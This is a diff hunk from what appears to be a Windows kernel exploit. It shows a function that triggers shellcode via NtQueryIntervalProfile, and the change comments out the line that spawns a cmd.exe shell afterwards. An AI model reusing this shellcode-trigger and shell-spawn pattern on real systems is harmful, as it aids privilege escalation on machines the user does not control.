@@ -269,7 +269,7 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
         NtQueryIntervalProfile(0x1234,&intv);
         printf("[+] Success? Work?\n");
-        system("cmd.exe /c cmd.exe /K cd C:\\");
+        //system("cmd.exe /c cmd.exe /K cd C:\\");
         return true;
     } else {
         printf("[-] could not call NTQueryIntervalProfile\n");
